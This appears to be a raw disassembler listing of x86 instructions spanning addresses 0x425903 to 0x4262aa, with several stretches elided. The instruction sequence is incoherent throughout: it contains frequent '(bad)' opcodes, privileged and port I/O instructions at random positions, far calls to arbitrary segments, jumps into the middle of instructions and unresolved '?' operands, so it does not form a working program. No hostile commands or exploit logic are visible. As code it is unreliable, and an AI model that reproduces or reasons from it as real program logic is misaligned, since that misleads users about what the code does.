  425903:	xchg   edx,eax
  425904:	mov    BYTE PTR [ecx+0x1050001],dl
  42590a:	add    BYTE PTR [eax],al
  42590c:	ficomp WORD PTR [esi-0x6d]
  42590f:	sub    al,0xa1
  425911:	mov    ch,BYTE PTR [ebp-0x7f39871e]
  425917:	or     al,0x55
  425919:	dec    ebp
  42591a:	sti    
  42591b:	nop
  42591c:	fisttp WORD PTR [eax+0x55]
  42591f:	dec    ebp
  425920:	ficom  DWORD PTR [edx+0x6664928e]
  425926:	pop    ebp
  425927:	es inc edx
  425929:	rcr    BYTE PTR [eax-0x57d2bf83],0xde
  425930:	sbb    BYTE PTR [ebx+0x3c],bh
  425933:	imul   esp,DWORD PTR [eax+0x47],0x9de3a9fe
  42593a:	add    al,0xd0
  42593c:	mov    ebp,?
  42593e:	addr16 je 0x4258f3
  425941:	add    eax,0x9102971f
  425946:	push   cs
  425947:	jmp    0x425974
  425949:	sub    al,0xfc
  42594b:	mov    edx,DWORD PTR [ecx+0x5cfe3a9]
  425951:	xchg   edi,eax
  425952:	push   esp
  425953:	mov    esi,0xc8a63386
  425958:	(bad)  
  42595a:	(bad)  
  42595c:	xchg   DWORD PTR [ebx+0x66],ecx
  42595f:	adc    eax,0xe45ce90b
  425964:	dec    esi
  425965:	or     BYTE PTR [eax-0x514fba73],0xf1
  42596c:	in     al,0x58
  42596e:	ficom  WORD PTR [edx]
  425970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425971:	fimul  WORD PTR [eax-0x410e3efc]
  425977:	pop    edi
  425978:	add    dh,BYTE PTR ds:0xfbe6c569
  42597e:	push   0x21
  425980:	ss test al,0xcb
  425983:	jno    0x42593c
  425985:	je     0x42599f
  425987:	mov    dl,0x4
  425989:	jmp    0x42592d
  42598b:	mov    esi,0x934a5fa8
  425990:	xlat   BYTE PTR ds:[ebx]
  425991:	pop    eax
  425992:	pop    ebx
  425993:	pusha  
  425994:	repnz pop ss
  425996:	dec    DWORD PTR [eax+eax*4-0xc]
  42599a:	or     DWORD PTR [esi+0xe],esi
  42599d:	lds    ebx,FWORD PTR [eax+eiz*2]
  4259a0:	int    0x4
  4259a2:	ret    
  4259a3:	pop    ebp
  4259a4:	push   0xa99e285c
  4259a9:	or     eax,0x5cedf98c
  4259ae:	sar    edx,1
  4259b0:	and    ch,BYTE PTR [ebx-0x35]
  4259b3:	push   edi
  4259b4:	call   0xec3:0x4cc7d0bc
  4259bb:	mov    fs,WORD PTR [edi]
  4259bd:	aam    0xfe
  4259bf:	jns    0x425987
  4259c1:	out    dx,al
  4259c2:	xchg   esi,eax
  4259c3:	inc    ecx
  4259c4:	sub    ebp,ecx
  4259c6:	jo     0x425962
  4259c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259c9:	jge    0x4259f9
  4259cb:	gs je  0x425a09
  4259ce:	cmp    esi,DWORD PTR [ecx]
  4259d0:	iret   
  4259d1:	test   eax,0x78f43dfa
  4259d6:	push   DWORD PTR [esi-0x3a6a1355]
  4259dc:	cmp    BYTE PTR [ebx+eax*8-0x676c9648],dh
  4259e3:	(bad)  
  4259e4:	or     cl,ch
  4259e6:	(bad)  [ebp-0x38]
  4259e9:	(bad)  
  4259ea:	jo     0x425a16
  4259ec:	add    edi,0xb5b1c686
  4259f2:	mov    ds:0xcb1ab0b3,al
  4259f7:	repnz or edi,edi
  4259fa:	xchg   ecx,eax
  4259fb:	gs int 0xda
  4259fe:	and    al,ch
  425a00:	fdiv   QWORD PTR [eax+0x58812cc9]
  425a06:	int    0xe8
  425a08:	and    esi,DWORD PTR [ecx-0x695e3be6]
  425a0e:	ja     0x4259c0
  425a10:	rol    BYTE PTR [eax],0x0
	...
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x69a9a025]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	xchg   ebx,eax
  425a8d:	pop    esp
  425a8e:	mov    esp,0xc93c2df5
  425a93:	leave  
  425a94:	fs icebp 
  425a96:	and    eax,0xe0bf8f79
  425a9b:	pop    ds
  425a9c:	pushf  
  425a9d:	pop    edx
  425a9e:	push   ecx
  425a9f:	mov    edi,0x73eb457a
  425aa4:	cmp    esp,DWORD PTR [esi]
  425aa6:	mov    esi,0x4cbdb569
  425aab:	mov    DWORD PTR [ebx-0x6954e793],eax
  425ab1:	rol    BYTE PTR gs:[edx+0x50d0b16a],cl
  425ab8:	and    eax,0x44e4506
  425abd:	xchg   BYTE PTR [esi-0x1f],ah
  425ac0:	jbe    0x425b03
  425ac2:	clc    
  425ac3:	sub    dl,BYTE PTR [esp+eiz*2]
  425ac6:	pop    ebp
  425ac7:	or     BYTE PTR [edx-0x64f378b2],cl
  425acd:	dec    edx
  425ace:	push   es
  425acf:	test   DWORD PTR [edx+0x46],0xef44b4c
  425ad6:	or     al,bh
  425ad8:	inc    esi
  425ad9:	push   eax
  425ada:	sub    bl,al
  425adc:	xor    eax,DWORD PTR [esi+0x3cc7c5bb]
  425ae2:	addr16 out 0x65,eax
  425ae5:	retf   0x4fcf
  425ae8:	ins    DWORD PTR es:[edi],dx
  425ae9:	pop    esi
  425aea:	sbb    BYTE PTR [esi-0x16c67e0a],dl
  425af0:	bound  ebp,QWORD PTR [ebx+0x764b33e3]
  425af6:	and    al,0xd2
  425af8:	ds aaa 
  425afa:	xor    al,0x7
  425afc:	nop
  425afd:	xchg   esp,eax
  425afe:	stos   BYTE PTR es:[edi],al
  425aff:	add    BYTE PTR [ebx+0x4e],0x10
  425b03:	lods   eax,DWORD PTR ds:[esi]
  425b04:	xchg   ecx,ecx
  425b06:	fs mov ah,ch
  425b09:	or     eax,DWORD PTR [edx-0xb]
  425b0c:	sbb    ah,BYTE PTR [ecx]
  425b0e:	sbb    al,0xd5
  425b10:	jmp    0xcccd806d
  425b15:	cmp    DWORD PTR [ecx+0x2bc3dedd],0xe6cc0f81
  425b1f:	jns    0x425b3c
  425b21:	mov    BYTE PTR [ebx-0x4c69fa58],0xea
  425b28:	(bad)  
  425b29:	stc    
  425b2a:	push   ss
  425b2b:	fist   WORD PTR [ebp-0x63]
  425b2e:	repnz mov bh,dl
  425b31:	test   DWORD PTR [ebx],0xe479d81a
  425b37:	mov    BYTE PTR [edx],bh
  425b39:	xchg   ebx,eax
  425b3a:	test   eax,0x19213316
  425b3f:	cmp    edi,DWORD PTR [esi]
  425b41:	xchg   DWORD PTR [edi],eax
  425b43:	jle    0x425b7f
  425b45:	das    
  425b46:	push   edx
  425b47:	dec    eax
  425b48:	sbb    edx,DWORD PTR [edx-0x7389b4b4]
  425b4e:	pop    esi
  425b4f:	ss js  0x425ae7
  425b52:	test   al,0xd7
  425b54:	and    BYTE PTR [eax+0x28],0xec
  425b58:	out    dx,al
  425b59:	ror    ebp,cl
  425b5b:	sub    al,0x2f
  425b5d:	sub    BYTE PTR [ebx],dh
  425b5f:	inc    eax
  425b60:	mov    ecx,DWORD PTR [ebx-0x59]
  425b63:	inc    esp
  425b64:	jo     0x425bbd
  425b66:	int    0xe8
  425b68:	pop    es
  425b69:	pop    ss
  425b6a:	mov    DWORD PTR [edx-0x4d],edi
  425b6d:	outs   dx,BYTE PTR ds:[esi]
  425b6f:	or     al,0x5
  425b71:	icebp  
  425b72:	in     eax,dx
  425b73:	dec    eax
  425b74:	push   0x85ba5347
  425b79:	aas    
  425b7a:	jno    0x425b1b
  425b7c:	aam    0xf5
  425b7e:	inc    edx
  425b7f:	mov    al,0x18
  425b81:	sub    al,0xd4
  425b83:	rcl    DWORD PTR [ecx-0x73],1
  425b86:	jnp    0x425bc9
  425b88:	shl    bl,cl
  425b8a:	xchg   eax,esi
  425b8c:	mov    eax,ds:0x2891f28f
	...
  425bf1:	add    BYTE PTR [eax],al
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	cld    
  425c01:	repnz (bad) 
  425c03:	pop    ds
  425c04:	xchg   edx,eax
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0xf2000001
  425c0d:	or     ebp,ebx
  425c0f:	add    BYTE PTR [ebp+0xe53b1bd],ah
  425c15:	dec    edi
  425c16:	sahf   
  425c17:	int    0xe2
  425c19:	xor    eax,0x140cd7
  425c1e:	test   al,0x10
  425c20:	rcr    BYTE PTR [ebx-0x2c11eb6a],0xbe
  425c27:	sub    al,BYTE PTR [edx+0x32002c74]
  425c2d:	neg    edi
  425c2f:	jl     0x425bcc
  425c31:	cmc    
  425c32:	das    
  425c33:	bound  ebp,QWORD PTR [edi-0x11]
  425c36:	and    ebp,eax
  425c38:	sub    ebp,DWORD PTR [ebp+0x21]
  425c3b:	mov    bl,BYTE PTR [edi]
  425c3d:	jl     0x425c44
  425c3f:	push   DWORD PTR ds:0xff0fac20
  425c45:	inc    edx
  425c46:	sub    cl,ch
  425c48:	je     0x425bd2
  425c4a:	jne    0x425c03
  425c4c:	xchg   ebx,eax
  425c4d:	stos   BYTE PTR es:[edi],al
  425c4e:	test   al,0x6c
  425c50:	mov    al,BYTE PTR [edx]
  425c52:	jbe    0x425c79
  425c54:	data16 cmp BYTE PTR [eax+0x4aedb410],ah
  425c5b:	jle    0x425cd0
  425c5d:	fdivr  DWORD PTR [edx+0x6c]
  425c60:	mov    BYTE PTR [ebx+0x211fd76a],dl
  425c66:	jno    0x425c86
  425c68:	cmc    
  425c69:	pop    esi
  425c6a:	(bad)  
  425c6b:	jg     0x425ce3
  425c6d:	leave  
  425c6e:	xchg   edx,eax
  425c6f:	stos   BYTE PTR es:[edi],al
  425c70:	add    al,0x9b
  425c72:	ret    
  425c73:	xchg   ebp,eax
  425c74:	push   ebp
  425c75:	xor    BYTE PTR [edi-0x3c],bl
  425c78:	out    0x4b,eax
  425c7a:	and    eax,0xa37858a0
  425c7f:	adc    BYTE PTR ds:0x6a4b08b5,bl
  425c85:	fwait
  425c86:	and    eax,0xe8aaa1d7
  425c8b:	(bad)  
  425c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c8e:	or     esp,DWORD PTR [edi+0x67]
  425c91:	leave  
  425c92:	dec    esp
  425c93:	das    
  425c94:	ins    DWORD PTR es:[edi],dx
  425c95:	jl     0x425cff
  425c97:	cmp    al,0x51
  425c99:	mov    cl,0x97
  425c9b:	sahf   
  425c9c:	cmc    
  425c9d:	cld    
  425c9e:	cli    
  425c9f:	(bad)  
  425ca0:	dec    esi
  425ca1:	stos   DWORD PTR es:[edi],eax
  425ca2:	out    dx,al
  425ca3:	or     dl,ah
  425ca5:	mov    al,0x9b
  425ca7:	stos   BYTE PTR es:[edi],al
  425ca8:	pop    es
  425ca9:	leave  
  425caa:	pop    eax
  425cab:	loop   0x425c34
  425cad:	mov    ds:0x9dc37c94,al
  425cb2:	cwde   
  425cb3:	out    0x14,al
  425cb5:	je     0x425cdf
  425cb7:	pop    es
  425cb8:	cwde   
  425cb9:	mov    ebp,0xafa254a0
  425cbe:	jne    0x425c84
  425cc0:	mov    ecx,0x7b1c5d9c
  425cc5:	in     eax,0xf6
  425cc7:	aas    
  425cc8:	daa    
  425cc9:	mov    ebp,0xeb481a6b
  425cce:	lods   al,BYTE PTR ds:[esi]
  425ccf:	pop    esi
  425cd0:	cs scas al,BYTE PTR es:[edi]
  425cd2:	mov    ah,0x1a
  425cd4:	mov    ebp,0xe761af2d
  425cd9:	in     al,dx
  425cda:	icebp  
  425cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425cdc:	add    esp,ecx
  425cde:	mov    ebx,0x128068b4
  425ce3:	push   eax
  425ce4:	push   eax
  425ce5:	jo     0x425c6c
  425ce7:	(bad)  
  425ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ce9:	mov    al,BYTE PTR [ecx-0x526c4411]
  425cef:	add    eax,0x6d650973
  425cf4:	add    DWORD PTR [esp+ebx*2+0x20],0x3f9df3d9
  425cfc:	inc    ecx
  425cfd:	outs   dx,DWORD PTR ds:[esi]
  425cfe:	push   ebp
  425cff:	(bad)  
  425d00:	(bad)  
  425d01:	xor    dh,BYTE PTR [eax-0x72]
  425d04:	out    0x7b,eax
  425d06:	jne    0x425d5d
  425d08:	mov    ds:0x1aff6e90,eax
  425d0d:	inc    ebx
  425d0e:	dec    ebx
  425d0f:	or     ah,dh
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x1ccc8c23,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0xc9000001
  425d8d:	sahf   
  425d8e:	out    dx,al
  425d8f:	push   ds
  425d90:	nop
  425d91:	cmp    al,0x85
  425d93:	ficomp DWORD PTR [edi-0x16]
  425d96:	test   eax,0x8be0ab22
  425d9b:	xchg   esi,eax
  425d9c:	or     edi,DWORD PTR [eax-0x67730af1]
  425da2:	jb     0x425da0
  425da4:	jg     0x425e0f
  425da6:	mov    bh,dl
  425da8:	xor    esi,ebp
  425daa:	dec    eax
  425dab:	inc    ebp
  425dac:	sub    DWORD PTR [eax+0x283ffaca],eax
  425db2:	fisubr DWORD PTR [esi+0x58]
  425db5:	push   ebp
  425db6:	mov    ebx,0x197d54dc
  425dbb:	fisub  DWORD PTR [edi]
  425dbd:	pop    ebx
  425dbe:	jecxz  0x425daa
  425dc0:	bndldx bnd1,[esi+eiz*8]
  425dc4:	adc    al,0x6c
  425dc6:	adc    al,0xc2
  425dc8:	imul   edi,DWORD PTR [edx+0x74],0xffffff80
  425dcc:	mov    al,dl
  425dce:	cmp    eax,0x79c8fe60
  425dd3:	inc    esi
  425dd4:	popf   
  425dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dd6:	iret   
  425dd7:	and    eax,DWORD PTR [esi-0x3]
  425dda:	sub    bh,BYTE PTR [ecx+0x6267dafe]
  425de0:	cmp    al,0x79
  425de2:	mov    WORD PTR [eax+0x42],fs
  425de5:	mov    eax,ds:0x26e04106
  425dea:	das    
  425deb:	inc    ebx
  425dec:	or     al,0x9b
  425dee:	ins    DWORD PTR es:[edi],dx
  425def:	dec    ebx
  425df0:	(bad)  
  425df1:	int3   
  425df2:	push   es
  425df3:	push   ss
  425df4:	ins    BYTE PTR es:[edi],dx
  425df5:	in     al,dx
  425df6:	jmp    0x425d8b
  425df8:	pop    esi
  425dfa:	ret    
  425dfb:	add    ebx,eax
  425dfd:	or     BYTE PTR [ebx],cl
  425dff:	cdq    
  425e00:	pop    ebp
  425e01:	pop    ebx
  425e02:	pop    es
  425e03:	and    bl,cl
  425e05:	rcl    DWORD PTR [edx+eax*1-0x3c683a98],1
  425e0c:	push   eax
  425e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e0e:	dec    ebx
  425e0f:	stc    
  425e10:	sbb    eax,0x2773643e
  425e15:	and    BYTE PTR [edi],dh
  425e17:	das    
  425e18:	pop    edi
  425e19:	out    dx,al
  425e1a:	(bad)  
  425e1c:	iret   
  425e1d:	fdivr  QWORD PTR [edi]
  425e1f:	sub    eax,0x3f2ca7dc
  425e24:	fwait
  425e25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e26:	cmc    
  425e27:	lock or eax,DWORD PTR [edi-0x4cad8d35]
  425e2e:	pop    edx
  425e2f:	push   esi
  425e30:	enter  0x4913,0x41
  425e34:	rcr    esp,cl
  425e36:	test   BYTE PTR [esi+0x1b301f31],ch
  425e3c:	sar    dh,0xb8
  425e3f:	add    BYTE PTR [ebx],bl
  425e41:	rcr    DWORD PTR [edi-0x4f51af44],cl
  425e47:	scas   al,BYTE PTR es:[edi]
  425e48:	in     eax,dx
  425e49:	pushf  
  425e4a:	mov    dh,0x8c
  425e4c:	sbb    ax,0xd58b
  425e50:	inc    edi
  425e51:	fcomp  QWORD PTR [esi-0x47]
  425e54:	mov    ?,eax
  425e56:	retf   0x9bfa
  425e59:	popf   
  425e5a:	pusha  
  425e5b:	or     cx,WORD PTR [ebp+0x18]
  425e5f:	repz adc eax,0xf31d67ce
  425e65:	iret   
  425e66:	cmp    al,0xeb
  425e68:	ins    DWORD PTR es:[edi],dx
  425e69:	xchg   ebx,eax
  425e6a:	pop    ds
  425e6b:	iret   
  425e6c:	stos   BYTE PTR es:[edi],al
  425e6d:	lock jae 0x425e06
  425e70:	into   
  425e71:	sbb    al,0xfb
  425e73:	sahf   
  425e74:	mov    dh,0x8b
  425e76:	popa   
  425e77:	fst    DWORD PTR [edi+0x4d1de392]
  425e7d:	cs hlt 
  425e7f:	lock pop ebx
  425e81:	add    eax,0x3f9176c
  425e86:	sub    ebp,DWORD PTR [edx]
  425e88:	dec    ebp
  425e89:	sahf   
  425e8a:	and    edi,edx
  425e8c:	jecxz  0x425e6d
  425e8e:	mov    eax,0x95e9
	...
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	mov    BYTE PTR [eax],dh
  425f02:	sub    dl,BYTE PTR [ebx-0x64]
  425f05:	xchg   ebp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    eax,0xe2000001
  425f0d:	sete   BYTE PTR [ecx+edx*2]
  425f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f12:	ja     0x425f4a
  425f14:	push   0x48e096ee
  425f19:	jae    0x425ed5
  425f1b:	mov    esp,0xcf425b8
  425f20:	mov    BYTE PTR [ecx],dl
  425f22:	mov    ch,0xfd
  425f24:	mov    BYTE PTR [esi+0x48],dl
  425f27:	js     0x425ef0
  425f29:	lock mov bl,0x55
  425f2c:	cmp    al,dh
  425f2e:	(bad)  
  425f2f:	jge    0x425f38
  425f31:	pusha  
  425f32:	stos   BYTE PTR es:[edi],al
  425f33:	shl    bh,1
  425f35:	dec    esp
  425f36:	mov    eax,0x89416bb5
  425f3b:	dec    ebp
  425f3c:	aaa    
  425f3d:	cmp    eax,0x517e7f82
  425f42:	sti    
  425f43:	cmp    al,BYTE PTR ds:0xbed70b13
  425f49:	shr    DWORD PTR [edx],cl
  425f4b:	popf   
  425f4c:	jg     0x425fcc
  425f4e:	add    dh,ah
  425f50:	call   0x611a:0x9cd066a
  425f57:	push   cs
  425f58:	repz adc ch,al
  425f5b:	jbe    0x425ef4
  425f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f5e:	aaa    
  425f5f:	mov    WORD PTR [bx+0x78b3],?
  425f64:	pop    edi
  425f65:	mov    dh,0xe0
  425f67:	out    0x4f,al
  425f69:	fisttp WORD PTR [edx]
  425f6b:	xchg   esi,eax
  425f6c:	pop    esi
  425f6d:	dec    edi
  425f6e:	mov    ebx,0x7f6e40b9
  425f73:	pushf  
  425f74:	xchg   ecx,eax
  425f75:	les    ebp,FWORD PTR [edi+0x2756958d]
  425f7b:	aas    
  425f7c:	pop    ebp
  425f7d:	mov    ebp,0xcb924235
  425f82:	(bad)  
  425f83:	nop
  425f84:	xor    al,BYTE PTR [ebx-0x33]
  425f87:	mov    edx,ecx
  425f89:	xchg   esp,eax
  425f8a:	scas   eax,DWORD PTR es:[edi]
  425f8b:	in     eax,dx
  425f8c:	dec    esp
  425f8d:	adc    ecx,ebx
  425f8f:	jmp    FWORD PTR [edi-0x29]
  425f92:	lock addr16 int 0x9e
  425f96:	out    dx,al
  425f97:	repz test eax,0x293be114
  425f9d:	mov    ecx,0xebea8f60
  425fa2:	std    
  425fa3:	and    eax,0xf248859
  425fa8:	sub    dl,bl
  425faa:	cmp    al,0x6c
  425fac:	fbld   TBYTE PTR [ecx+0x2c]
  425faf:	clc    
  425fb0:	mov    ah,0x63
  425fb2:	fist   WORD PTR [edx+0x4a]
  425fb5:	dec    esp
  425fb6:	dec    esi
  425fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fb9:	pop    es
  425fba:	mov    edx,0xc4daa1eb
  425fbf:	xor    eax,0xe5932331
  425fc4:	lods   al,BYTE PTR ds:[esi]
  425fc5:	mov    edx,0x2ad404e5
  425fca:	sbb    al,BYTE PTR fs:[edi+0x33]
  425fce:	mov    edx,0xbb0026ab
  425fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fd4:	or     ebp,DWORD PTR [edi]
  425fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fd7:	xchg   esp,eax
  425fd8:	cli    
  425fd9:	jnp    0x425f63
  425fdb:	call   0xd849:0xcf74
  425fe1:	(bad)  
  425fe2:	jae    0x425fe6
  425fe4:	adc    al,0xae
  425fe6:	mov    eax,ds:0x7dd69eab
  425feb:	xor    eax,eax
  425fed:	stos   DWORD PTR es:[edi],eax
  425fee:	lahf   
  425fef:	nop
  425ff0:	and    BYTE PTR [edi+0x7aef0e96],0x3e
  425ff7:	sub    eax,DWORD PTR [ebx+0xf88d445]
  425ffd:	lods   eax,DWORD PTR ds:[esi]
  425ffe:	ins    DWORD PTR es:[edi],dx
  425fff:	leave  
  426000:	in     al,0x6f
  426002:	lea    ebp,[esi+0x3ac56f1]
  426008:	jl     0x426070
  42600a:	fwait
  42600b:	retf   
  42600c:	sar    BYTE PTR [ecx+0x2],0x23
  426010:	mov    ds:0x0,al
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	jp     0x4260b5
  426082:	clc    
  426083:	inc    esp
  426084:	mov    eax,ds:0x5000196
  426089:	add    DWORD PTR [eax],eax
  42608b:	add    ch,dh
  42608d:	xlat   BYTE PTR ds:[ebx]
  42608e:	test   esi,eax
  426090:	je     0x42602a
  426092:	push   edi
  426093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426094:	jbe    0x4260e7
  426096:	jge    0x426106
  426098:	cwde   
  426099:	and    al,0x87
  42609b:	inc    esp
  42609c:	inc    esp
  42609d:	cmp    edi,eax
  42609f:	or     eax,0x8973bebc
  4260a4:	xchg   esi,eax
  4260a5:	jbe    0x4260e1
  4260a7:	inc    ebx
  4260a8:	das    
  4260a9:	mov    edx,0xcfbe0990
  4260ae:	pop    ebx
  4260af:	mov    esi,edi
  4260b1:	test   DWORD PTR [ecx],edx
  4260b3:	sti    
  4260b4:	lea    ecx,[edx-0x55ad0fd4]
  4260ba:	ds jle 0x426128
  4260bd:	lock shr DWORD PTR [edi+0x6f3aea8d],1
  4260c4:	add    eax,esp
  4260c6:	pop    esi
  4260c7:	xchg   BYTE PTR [esi+0x4111b6dc],cl
  4260cd:	or     al,0x86
  4260cf:	adc    BYTE PTR [ebx+0x4aadb033],dl
  4260d5:	inc    eax
  4260d6:	outs   dx,BYTE PTR ds:[esi]
  4260d7:	scas   eax,DWORD PTR es:[edi]
  4260d8:	stos   DWORD PTR es:[edi],eax
  4260d9:	sub    esi,esp
  4260db:	inc    eax
  4260dc:	ins    BYTE PTR es:[edi],dx
  4260dd:	scas   al,BYTE PTR es:[edi]
  4260de:	jge    0x4260fa
  4260e0:	jns    0x426098
  4260e2:	and    dh,BYTE PTR [ebx-0x2d]
  4260e5:	pop    es
  4260e6:	mov    DWORD PTR [eax+0x51],ebp
  4260e9:	push   es
  4260ea:	stc    
  4260eb:	sub    cl,BYTE PTR [esi-0x467bf048]
  4260f1:	inc    eax
  4260f2:	xchg   edi,eax
  4260f3:	lods   al,BYTE PTR ds:[esi]
  4260f4:	gs xor cl,dl
  4260f7:	and    dl,dh
  4260f9:	jge    0x426104
  4260fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260fc:	push   cs
  4260fd:	pop    es
  4260fe:	xor    al,0xd9
  426100:	mov    ds:0x99e7e8a2,eax
  426105:	fcomp  QWORD PTR [esi+0x1414072d]
  42610b:	jnp    0x426132
  42610d:	lods   al,BYTE PTR ds:[esi]
  42610e:	jne    0x4260f7
  426110:	sti    
  426111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426112:	jbe    0x426102
  426114:	daa    
  426115:	inc    edx
  426116:	dec    esp
  426117:	add    eax,0xbf2084f3
  42611c:	push   edi
  42611d:	xor    BYTE PTR [eax-0x69],cl
  426120:	cmp    eax,DWORD PTR [esi]
  426122:	in     eax,dx
  426123:	or     DWORD PTR [edi+0x0],esi
  426126:	adc    bh,ah
  426128:	test   DWORD PTR [ecx-0x191b6975],edx
  42612e:	push   0x28
  426130:	retf   0x1806
  426133:	mov    ch,0xeb
  426135:	dec    edi
  426136:	mov    ds,WORD PTR [ebp-0x3e]
  426139:	jnp    0x42614b
  42613b:	popf   
  42613c:	outs   dx,BYTE PTR ds:[esi]
  42613d:	retf   
  42613e:	int3   
  42613f:	sbb    eax,0x7607ce34
  426144:	or     BYTE PTR [bx+si],ch
  426147:	dec    ebp
  426148:	push   ecx
  426149:	sbb    bh,BYTE PTR [edx-0x6e]
  42614c:	adc    eax,0xf8ea2ac4
  426151:	ins    DWORD PTR es:[edi],dx
  426152:	sbb    al,BYTE PTR [ebp+0x6403ba13]
  426158:	repz fisub DWORD PTR [eax]
  42615b:	das    
  42615c:	inc    esi
  42615d:	pop    es
  42615e:	add    ah,BYTE PTR [ebx]
  426160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426161:	test   dl,al
  426163:	xchg   ebp,eax
  426164:	mov    ds:0xace17cc,al
  426169:	shl    DWORD PTR [esi+0x6b],cl
  42616c:	mov    eax,0x8cd5f6d0
  426171:	dec    esi
  426172:	frstor [edx]
  426174:	xor    BYTE PTR [ecx+0x1],cl
  426177:	add    ebp,DWORD PTR [edi+0x4a]
  42617a:	mov    es,eax
  42617c:	mov    al,ds:0x4a3eef17
  426181:	cs inc esp
  426183:	add    al,0x60
  426185:	pop    esp
  426186:	(bad)  
  426187:	jbe    0x42611f
  426189:	cmp    edi,DWORD PTR [ecx]
  42618b:	cdq    
  42618c:	std    
  42618d:	pop    ebp
  42618e:	adc    DWORD PTR [edi+0x88],ecx
	...
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx-0x260172d9],0x1e
  426204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426205:	xchg   edi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    eax,0xa2000001
  42620d:	lock pop esi
  42620f:	dec    esp
  426210:	aaa    
  426211:	dec    ecx
  426212:	shl    BYTE PTR [edi+0x3be47b13],cl
  426218:	(bad)  
  426219:	jecxz  0x426272
  42621b:	scas   eax,DWORD PTR es:[edi]
  42621c:	mov    esi,0xf87e3cdd
  426221:	aaa    
  426222:	(bad)  
  426223:	or     al,0xd
  426225:	stos   DWORD PTR es:[edi],eax
  426226:	loope  0x426222
  426228:	push   0x1d
  42622a:	sub    ah,cl
  42622c:	fdiv   QWORD PTR [ebx+0x57a467fd]
  426232:	adc    esi,ebx
  426234:	fwait
  426235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426236:	dec    esi
  426237:	fnstsw WORD PTR ds:0xce266328
  42623d:	cmp    esi,DWORD PTR [ebp+0x262b4957]
  426243:	(bad)  
  426244:	push   0xffffffdb
  426246:	push   es
  426247:	inc    esi
  426248:	retf   0x7b80
  42624b:	adc    al,0xc9
  42624d:	addr16 jb 0x42626a
  426250:	or     BYTE PTR [ebp+0x3e46a8f2],0x5b
  426257:	inc    esi
  426258:	sub    bl,BYTE PTR [edx+0x5c6c1dc1]
  42625e:	lds    esi,FWORD PTR [ecx+0x1c10237c]
  426264:	xchg   ebx,eax
  426265:	(bad)  
  426266:	jl     0x426297
  426268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426269:	imul   ecx,edi,0xc7a6b6fa
  42626f:	aad    0x12
  426271:	mov    ah,0xbb
  426273:	lods   eax,DWORD PTR ds:[esi]
  426274:	out    dx,eax
  426275:	ins    DWORD PTR es:[edi],dx
  426276:	inc    edx
  426277:	mov    dl,0x7a
  426279:	aad    0x62
  42627b:	int3   
  42627c:	push   ebx
  42627d:	loope  0x426268
  42627f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426280:	mov    ah,0x17
  426282:	mov    ds:0xe83c1871,eax
  426287:	xchg   cl,bh
  426289:	daa    
  42628a:	outs   dx,BYTE PTR ds:[esi]
  42628b:	mov    edi,0x2bba86de
  426290:	push   ds
  426291:	pop    edi
  426292:	fs cwde 
  426294:	(bad)
  426298:	add    BYTE PTR [ecx-0x4],ah
  42629b:	push   esi
  42629c:	fisubr DWORD PTR [ebx+0x4795dc40]
  4262a2:	iret   
  4262a3:	mov    ds:0x4540b95d,eax
  4262a8:	jne    0x4262e0
  4262aa:	imul   eax,esi,0x8
